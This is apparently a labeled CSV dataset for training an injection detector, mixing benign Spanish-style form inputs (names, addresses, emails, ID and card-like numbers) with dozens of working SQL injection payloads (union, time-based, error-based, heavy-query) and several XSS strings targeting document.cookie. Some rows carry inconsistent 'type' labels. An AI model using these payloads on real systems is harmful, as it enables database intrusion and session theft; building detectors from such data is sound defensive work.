Text,attack_type,Label,type
consist+ente,norm,0,normal
c/ alcalde gabriel mejias pombo 121 6-f,norm,0,normal
"1"") union all select null--",sqli,1,sql
31172,norm,0,normal
"-2453"") union all select 4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--",sqli,1,sql
tapies ximenis,norm,0,normal
alb6rrneo,norm,0,normal
4535499067699743,norm,0,normal
63375335p,norm,0,normal
burns40,norm,0,normal
8ap6l4984,norm,0,normal
"burgos, s/n, 1f",norm,0,normal
978,norm,0,normal
31228,norm,0,normal
"1'+(select idnb where 2338=2338;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)+'",sqli,1,sql
echecopar torrella,norm,0,normal
"-1076 union all select 3959,3959--",sqli,1,sql
3245452183569196,norm,0,normal
del nuevo mundo s/n,norm,0,normal
verdusco,norm,0,normal
2008736994858842,norm,0,normal
riodeva,norm,0,normal
frison@barnizultravioleta.jm,norm,0,normal
urkiaga,norm,0,normal
eduardo,norm,0,normal
06130,norm,0,normal
macuare ribes,norm,0,normal
4978848315399103,norm,0,normal
malparto,norm,0,normal
0381931472623301,norm,0,normal
1')) rlike sleep(5) and (('iwct'='iwct,sqli,1,normal
trikonis_ruschel@beatrizbalado.zw,norm,0,normal
"1%') union all select null,null,null,null,null,null--",sqli,1,sql
-2992')) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('tjgt'='tjgt,sqli,1,sql
0399278648684869,norm,0,normal
4108422495216222,norm,0,normal
1);select case when 7951=1147 then 1 else null end--,sqli,1,sql
"-2840'))) union all select 3025,3025,3025,3025--",sqli,1,sql
walker@ebaz.vi,norm,0,normal
"1'||(select 'nfgq' where 1837=1837 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
jeffries,norm,0,normal
molero bubnjar,norm,0,normal
velilla de cinca,norm,0,normal
-8684' where 9820=9820 or 6844=5105,sqli,1,normal
arnold,norm,0,normal
torvizcn,norm,0,normal
silvina,norm,0,normal
"-9934"") or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""xecb"" like ""xecb",sqli,1,sql
iberio,norm,0,normal
77293077j,norm,0,normal
rains8,norm,0,normal
de la cerda gassol,norm,0,normal
"gravina, 78",norm,0,normal
av. del mar cantabrico 176 6-d,norm,0,normal
72,norm,0,normal
28614822q,norm,0,normal
brayam,norm,0,normal
gomska.hopper@ebuy.com.bi,norm,0,normal
hoefer.tabuyo@gopersonalfitness.nz,norm,0,normal
martn del ro,norm,0,normal
<script>alert(document.cookie)</script> <script>alert(document.cookie)</script>@gmail.com,xss,2,xss
"calle padre perpian, 90, 7-b",norm,0,normal
31560,norm,0,normal
05200,norm,0,normal
alicanto,norm,0,normal
"1) as dqda where 1624=1624 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"camino de los cipreses 125,",norm,0,normal
"1%"");select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
99997973e,norm,0,normal
"1') and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('yqzg'='yqzg",sqli,1,sql
1%'));select sleep(5)#,sqli,1,sql
tubal,norm,0,normal
"1%') or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ('%'='",sqli,1,normal
"1"" and 7533=7533",sqli,1,normal
"1 union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
mosegui bofill,norm,0,normal
-t6a1niet7,norm,0,normal
3428501234979373,norm,0,normal
-7901) order by 1--,sqli,1,sql
92173990h,norm,0,normal
"rua principal, 176",norm,0,normal
jeft,norm,0,normal
8451,norm,0,normal
04878,norm,0,normal
1') or sleep(5) and ('mdmr' like 'mdmr,sqli,1,normal
"calle valle de salazar, 48,",norm,0,normal
shar,norm,0,normal
48638626c,norm,0,normal
1' where 6913=6913 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,sql
63313769j,norm,0,normal
"carrer violas, 60,",norm,0,normal
"1;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3",sqli,1,sql
"calle toronja, 157",norm,0,normal
"1""));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((""zzmn""=""zzmn",sqli,1,sql
"passeig desert 180,",norm,0,normal
flo hosta,norm,0,normal
4e03+17a9a,norm,0,normal
2ecur0i8a,norm,0,normal
5607274841156559,norm,0,normal
c/ david 169 6-h,norm,0,normal
ventura motn,norm,0,normal
hamlett,norm,0,normal
"-5572"") union all select 8131,8131#",sqli,1,sql
2672,norm,0,normal
"botellas, 97 9a",norm,0,normal
1 where 7038=7038;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
"1 union all select null,null,null,null,null,null--",sqli,1,sql
42210,norm,0,normal
57764889k,norm,0,normal
feridad,norm,0,normal
55964057c,norm,0,normal
melanson,norm,0,normal
8569,norm,0,normal
arvid,norm,0,normal
persidsky@filtraciondehumos.md,norm,0,normal
bl!teo,norm,0,normal
"1'+(select mhfn where 2425=2425;select count(*) from generate_series(1,5000000))+'",sqli,1,sql
"petxina, 77, 2b",norm,0,normal
3ar6i383,norm,0,normal
86090489v,norm,0,normal
em8a2t118r,norm,0,normal
licinio,norm,0,normal
1444,norm,0,normal
"1)) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((9542=9542",sqli,1,normal
procltico,norm,0,normal
no,norm,0,normal
sandi,norm,0,normal
1' rlike sleep(5),sqli,1,normal
9570,norm,0,normal
castrillo matajudos,norm,0,normal
huyente,norm,0,normal
"1,iif(1440=4612,1,1/0)",sqli,1,normal
"1"" or sleep(5) and ""telb""=""telb",sqli,1,normal
angold@callofduty6.nu,norm,0,normal
"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",sqli,1,sql
inoportunamente,norm,0,normal
"1%') or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ('%'='",sqli,1,sql
38355013y,norm,0,normal
1019,norm,0,normal
corrales de duero,norm,0,normal
3ist423o,norm,0,normal
"1%"") or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (""%""=""",sqli,1,normal
"1"";select (case when (1961=2048) then 1961 else 1961*(select 1961 from information_schema.character_sets) end)#",sqli,1,sql
"1' where 6902=6902 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
7576,norm,0,normal
"1%' and 3824=benchmark(5000000,md5(0x76555642)) and '%'='",sqli,1,normal
25938703q,norm,0,normal
"""javascript:alert(2)"">",xss,2,xss
picaronaza,norm,0,normal
fraser,norm,0,normal
corts,norm,0,normal
"1 or elt(6272=6272,sleep(5))# klaw",sqli,1,normal
"general lacy, 122",norm,0,normal
hervs bediaga,norm,0,normal
clemant@engibraltar.com.ae,norm,0,normal
zou,norm,0,normal
grinnage@programagestionerp.kn,norm,0,normal
"1 where 7642=7642 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",sqli,1,sql
"-5652%') union all select 4447,4447,4447,4447,4447,4447,4447,4447,4447--",sqli,1,sql
"-5014%""))) or 3348=2430--",sqli,1,sql
-6190'))) union all select 9413--,sqli,1,sql
drane,norm,0,normal
05365,norm,0,normal
trobos 39 4e,norm,0,normal
iracen,norm,0,normal
1';select pg_sleep(5) and 'qfaz' like 'qfaz,sqli,1,sql
"1"") union all select null,null,null#",sqli,1,sql
"1' in boolean mode) and 3824=benchmark(5000000,md5(0x76555642))#",sqli,1,normal
09247,norm,0,normal
"carrer felix cucurull, 167 3-a",norm,0,normal
"c/ barriada nueva andalucia, 79, 5?f",norm,0,normal
pico.malm@4horas.sm,norm,0,normal
"-1<iframe src=""javascript:document.cookie=true;""></iframe>",xss,2,xss
4124162736834322,norm,0,normal
lidia,norm,0,normal
"-7238%' or make_set(5375=9563,9563) and '%'='",sqli,1,normal
3823811440410539,norm,0,normal
espelt bone,norm,0,normal
339a.redo,norm,0,normal
tolan.herlie@movil-google.mx,norm,0,normal
"1'+(select qtyi where 7147=7147;select count(*) from generate_series(1,5000000)--",sqli,1,sql
44222,norm,0,normal
9886608978335494,norm,0,normal
1)));if(3490=4920) select 3490 else drop function hlzt--,sqli,1,sql
"1%')) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
0h5rrad0,norm,0,normal
felleghy@zafranet.md,norm,0,normal
"1'+(select 'bmit' where 3716=3716 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))+'",sqli,1,sql
"norte 131, 8?e",norm,0,normal
tarp@redstarz.asia,norm,0,normal
"1%"");select count(*) from generate_series(1,5000000)--",sqli,1,sql
1' in boolean mode) and 5981=6700,sqli,1,normal
1'||(select 'xugb' from dual where 6772=6772;if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
0908272174397466,norm,0,normal
9637,norm,0,normal
1) and (2342=3620)*3620,sqli,1,normal
1em5le28r,norm,0,normal
guabo,norm,0,normal
resello,norm,0,normal
"1%');call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"1')) as cbka where 3176=3176 and 8407=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
43511,norm,0,normal
"1"" or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ""ymwb""=""ymwb",sqli,1,sql
-3136%') or 3400=6002,sqli,1,normal
shanping,norm,0,normal
milton@diagnosticoradiologico.asia,norm,0,normal
kappa,norm,0,normal
"c/ pozo seco 37, 6-d",norm,0,normal
mame,norm,0,normal
carol,norm,0,normal
3119845322220598,norm,0,normal
machar,norm,0,normal
"1')) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('yzdp'='yzdp",sqli,1,sql
1%') and 4061=2730#,sqli,1,normal
91257210h,norm,0,normal
tempest@quadernideilgarda.gg,norm,0,normal
"-4860') as azyx where 6901=6901 union all select 6901,6901,6901,6901,6901#",sqli,1,sql
entolar,norm,0,normal
"1')));iif(5257=5257,1,1/0)",sqli,1,sql
"1' in boolean mode) union all select null,null,null,null,null,null,null--",sqli,1,sql
"1%' union all select null,null,null#",sqli,1,sql
8180,norm,0,normal
45314,norm,0,normal
"1"" where 5236=5236 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1,sql
1' and 5967=4184#,sqli,1,normal
"-4856' in boolean mode) union all select 1074,1074,1074,1074,1074,1074,1074#",sqli,1,sql
agatn,norm,0,normal
rom87231o,norm,0,normal
7395,norm,0,normal
vano branchadell,norm,0,normal
1') and (select * from (select(sleep(5)))fzno) and ('eqfh'='eqfh,sqli,1,sql
"arco, el",norm,0,normal
"1)) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((8867=8867",sqli,1,normal
1'||(select 'yucg' where 2576=2576 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual))||',sqli,1,sql
55z8do,norm,0,normal
caterina,norm,0,normal
oliv_icultora,norm,0,normal
"-5058%' union all select 6789,6789,6789,6789,6789#",sqli,1,sql
alienacin,norm,0,normal
quint,norm,0,normal
1%'));waitfor delay '0:0:5'--,sqli,1,sql
6653,norm,0,normal
boisvert,norm,0,normal
34111,norm,0,normal
81012741w,norm,0,normal
luquin,norm,0,normal
1'||(select 'ilkr' from dual where 9296=9296;select case when 7717=7717 then 1 else null end--,sqli,1,sql
"1%"");select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,1,sql
aguistin,norm,0,normal
-1765') order by 1--,sqli,1,sql
1') and 9198=9198--,sqli,1,sql
ashlin,norm,0,normal
3654394570755468,norm,0,normal
ardevol herrador,norm,0,normal
bonil schettino,norm,0,normal
"c/ severo ochoa, 133 13?c",norm,0,normal
nanni-prucnal@fighting-machines.gf,norm,0,normal
"calle arc de sant marti, 56",norm,0,normal
0urifica2er0,norm,0,normal
angs,norm,0,normal
cedo rosa's,norm,0,normal
coripe,norm,0,normal
caravantes,norm,0,normal
carlosmara,norm,0,normal
"1')) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('swjk'='swjk",sqli,1,normal
yoon,norm,0,normal
"1%"") and (select * from (select(sleep(5)))fzno) and (""%""=""",sqli,1,sql
"-2718"") or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""kbvd"" like ""kbvd",sqli,1,sql
pacfica,norm,0,normal
chilln,norm,0,normal
29491,norm,0,normal
43888363q,norm,0,normal
in977ili903,norm,0,normal
loyola,norm,0,normal
ratbodo,norm,0,normal
48435837e,norm,0,normal
1467,norm,0,normal
43364,norm,0,normal
28287163s,norm,0,normal
abagail,norm,0,normal
pente@maxitienda.ms,norm,0,normal
"c/ serrano, 125,",norm,0,normal
vish,norm,0,normal
"1%""));(select * from (select(sleep(5)))srmq) and ((""%""=""",sqli,1,sql
1' where 4253=4253;waitfor delay '0:0:5'--,sqli,1,sql
c0l0o4a,norm,0,normal
manzano babot,norm,0,normal
"-3541"" or make_set(9354=9354,7185) and ""fgxu""=""fgxu",sqli,1,normal
7231,norm,0,normal
-8812 or 6872=6872# dflr,sqli,1,normal
"-9111"" or 3038=3038",sqli,1,normal
2756434329152004,norm,0,normal
06773874y,norm,0,normal
15552,norm,0,normal
"grado, el",norm,0,normal
victoria,norm,0,normal
daroca,norm,0,normal
aimar taulats,norm,0,normal
"1"" where 9804=9804 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"camino san jaime 97,",norm,0,normal
el khouri hausdorf,norm,0,normal
1) where 4780=4780;begin dbms_lock.sleep(5); end--,sqli,1,sql
"c/ periodista adeflor, 12,",norm,0,normal
"-2610%"") union all select 7779,7779,7779,7779,7779--",sqli,1,sql
7387,norm,0,normal
flixmara,norm,0,normal
peluffo1@psicoencuentronline.va,norm,0,normal
torremocha del campo,norm,0,normal
perales del alfambra,norm,0,normal
villaseco del pan,norm,0,normal
tutusaus tenza,norm,0,normal
debicki@prestoesesto.hr,norm,0,normal
"calle sant marti, 164",norm,0,normal
"-6158""))) or 8571=8571--",sqli,1,sql
44381,norm,0,normal
"1') or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
6,norm,0,normal
22655130s,norm,0,normal
"-4031%"" union all select 9566--",sqli,1,sql
svenn-er,norm,0,normal
gossett@conac.com.li,norm,0,normal
"1"" where 1618=1618 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"c/ mirra 25,",norm,0,normal
forcarei,norm,0,normal
7562939151589208,norm,0,normal
29640,norm,0,normal
7993090576542905,norm,0,normal
"1') or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
"1"" where 8978=8978 union all select null,null,null,null,null,null,null,null--",sqli,1,sql
5706258775201783,norm,0,normal
"-8448%"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""%""=""",sqli,1,sql
pfitzmann_bray@cirugiaparpado.an,norm,0,normal
"1');select count(*) from generate_series(1,5000000) and ('tnvm' like 'tnvm",sqli,1,sql
c/ sagrada familia 176,norm,0,normal
"1"" or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
"1"" where 1831=1831 and (select * from (select(sleep(5)))gcrr)#",sqli,1,sql
kresl,norm,0,normal
2639,norm,0,normal
2872946473881757,norm,0,normal
tanchak,norm,0,normal
2278515903267835,norm,0,normal
1') where 5287=5287 and 7533=7533--,sqli,1,sql
mieres,norm,0,normal
behetra,norm,0,normal
1') and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('hgwt' like 'hgwt,sqli,1,sql
duby@mtos.mt,norm,0,normal
"1"")) as wugz where 5355=5355 and 3824=benchmark(5000000,md5(0x76555642))--",sqli,1,sql
"1'))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((('jhle' like 'jhle",sqli,1,normal
"1' or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'ebuo'='ebuo",sqli,1,sql
abi,norm,0,normal
"vinyals, 117 4?e",norm,0,normal
"1')));select count(*) from generate_series(1,5000000)--",sqli,1,sql
ombra,norm,0,normal
-4947' order by 1#,sqli,1,normal
weddle@teamspanish.bz,norm,0,normal
"pl. quintero baez, 137",norm,0,normal
5450,norm,0,normal
1) as lvfu where 5831=5831 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1,sql
flor chino,norm,0,normal
"-5989%"" union all select 3581,3581,3581,3581,3581--",sqli,1,sql
pistan robredo,norm,0,normal
"1'+(select 'asmj' where 7808=7808 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5))+'",sqli,1,sql
stanleig,norm,0,normal
sigenza,norm,0,normal
dafoe,norm,0,normal
3872,norm,0,normal
"1"" where 1051=1051 union all select null--",sqli,1,sql
"1%"" or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""%""=""",sqli,1,sql
81784894e,norm,0,normal
2354,norm,0,normal
ardys,norm,0,normal
a55r4e1a,norm,0,normal
9oautora,norm,0,normal
83497200r,norm,0,normal
"1' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and 'owwf'='owwf",sqli,1,sql
rorke,norm,0,normal
elex,norm,0,normal
urrucha comallonga,norm,0,normal
07077546d,norm,0,normal
roson-hawke@horiginales.bh,norm,0,normal
"1"");select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (""layz""=""layz",sqli,1,sql
"1"")) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((""nzhj"" like ""nzhj",sqli,1,normal
7196721387049140,norm,0,normal
1%'));select (case when (4006=1276) then 1 else 4006*(select 4006 from master..sysdatabases) end)--,sqli,1,sql
27340064x,norm,0,normal
"calle san lazaro, 115, 4-b",norm,0,normal
bjorn,norm,0,normal
"1' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and 'mvkg'='mvkg",sqli,1,sql
"1') as mpsf where 3348=3348;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
78,norm,0,normal
paton,norm,0,normal
5639,norm,0,normal
eddier,norm,0,normal
santa eufemia del arroyo,norm,0,normal
"-6747"" or 9323=9323#",sqli,1,normal
10970,norm,0,normal
c4e32788ia,norm,0,normal
1'+(select iowv where 6105=6105 and sleep(5)#,sqli,1,sql
santa marina del rey,norm,0,normal
postema,norm,0,normal
"1'+(select tnch where 1867=1867 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",sqli,1,sql
"camio adelfas, 148, 5?g",norm,0,normal
280,norm,0,normal
desyerbadora,norm,0,normal
-3881))) union all select 4438--,sqli,1,sql
cuitada,norm,0,normal
alisik-koller@coreserv.zm,norm,0,normal
2abonos1,norm,0,normal
"1%"")));select pg_sleep(5) and (((""%""=""",sqli,1,sql
"1%' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and '%'='",sqli,1,sql
"-9721' or elt(9511=9238,9238)",sqli,1,normal
fortner,norm,0,normal
abordonar,norm,0,normal
"1 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
hoel,norm,0,normal
58772485x,norm,0,normal
cabanabona,norm,0,normal
tarsila,norm,0,normal
vasilescu.lisi@drogasvirtuales.sc,norm,0,normal
"1%'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('%'='",sqli,1,normal
steklasa,norm,0,normal
gerarda,norm,0,normal
9167,norm,0,normal
fisicoqumico,norm,0,normal
"1"");select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""yxes"" like ""yxes",sqli,1,sql
clariana de cardener,norm,0,normal
vilcu-verschuer@eddydaniele.kz,norm,0,normal
48650,norm,0,normal
1'+(select xzse where 4530=4530;(select * from (select(sleep(5)))srmq))+',sqli,1,sql
escal,norm,0,normal
"-3856"") as iyzl where 7394=7394 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('wdeu' like 'wdeu",sqli,1,sql
chamberlin@nikemujeres.py,norm,0,normal
"-5904"" where 9782=9782 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",sqli,1,sql
10250,norm,0,normal
"1 where 2060=2060;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
42,norm,0,normal
carcabuey,norm,0,normal
99ortadero,norm,0,normal
"1"" where 4298=4298 order by 1--",sqli,1,sql
gorin.mccracken@evelin.am,norm,0,normal
"1')));select count(*) from generate_series(1,5000000) and ((('xori' like 'xori",sqli,1,sql
"-9392)) or elt(1032=1032,3623) and ((2975=2975",sqli,1,normal
"1%""))) or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
castejn de tornos,norm,0,normal
9435,norm,0,normal
25613,norm,0,normal
96527161w,norm,0,normal
requena de campos,norm,0,normal
sibirskaia@euskalcasino.es,norm,0,normal
"1')(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))",sqli,1,sql
72523597c,norm,0,normal
bethania,norm,0,normal
"-1269' or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'gohv' like 'gohv",sqli,1,sql
7m63e31r,norm,0,normal
"1"")) as kmss where 3214=3214 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
"1' or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1""))) and (select * from (select(sleep(5)))fzno) and (((""jenb"" like ""jenb",sqli,1,sql
"1));select benchmark(5000000,md5(0x4c4d6142)) and ((6866=6866",sqli,1,sql
"1) as cejp where 4736=4736 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"1%'))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((('%'='",sqli,1,sql
1') and 4822=6997 and ('ojku'='ojku,sqli,1,normal
"-4811%')) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('%'='",sqli,1,sql
31593,norm,0,normal
langlois_benavente@sutelefono.mg,norm,0,normal
0057204714004346,norm,0,normal
1 where 3027=3027 and 4595=4595#,sqli,1,normal
"-1064' or make_set(6439=2937,2937) and 'qojd'='qojd",sqli,1,normal
cholewin,norm,0,normal
1' and (select * from (select(sleep(5)))fzno) and 'mepp'='mepp,sqli,1,sql
1) as zzip where 5353=5353 and 3394=3092,sqli,1,normal
"1')) as agdn where 8442=8442 and 3824=benchmark(5000000,md5(0x76555642))--",sqli,1,sql
sada,norm,0,normal
"calle molin el toro 28,",norm,0,normal
janssen,norm,0,normal
pelland,norm,0,normal
9584356702291868,norm,0,normal
22484,norm,0,normal
camita,norm,0,normal
-4610')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('hdco'='hdco,sqli,1,sql
gidaro,norm,0,normal
-1087) where 5787=5787 union all select 5787#,sqli,1,sql
san salvador,norm,0,normal
"alcalde baeza medina, s/n,",norm,0,normal
1867101585349432,norm,0,normal
"1') union all select null,null,null,null--",sqli,1,sql
"1"") where 2633=2633 union all select null,null,null,null#",sqli,1,sql
-6081 where 3681=3681 or 2603=3138--,sqli,1,sql
"-9774'))) union all select 6954,6954,6954#",sqli,1,sql
azuqueca de henares,norm,0,normal
forua,norm,0,normal
orera,norm,0,normal
"1""))) union all select null,null,null,null,null,null--",sqli,1,sql
"-1503"" order by 1--",sqli,1,sql
e7piocha,norm,0,normal
"1%"") union all select null,null,null,null,null#",sqli,1,sql
6766,norm,0,normal
"1 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)# ujdg",sqli,1,sql
fabrs xamena,norm,0,normal
"<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:document.cookie=true""></b></i></xml><span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>",xss,2,sql
redon-eagles@planesypensiones.mil,norm,0,normal
mazzotti9@novaservicios.bi,norm,0,normal
d119a,norm,0,normal
ledenburg.clapp@serviconlevante.museum,norm,0,normal
elane,norm,0,normal
"-3137'||(select 'btif' where 1718=1718 union all select 1718,1718,1718,1718,1718,1718,1718,1718,1718#",sqli,1,sql
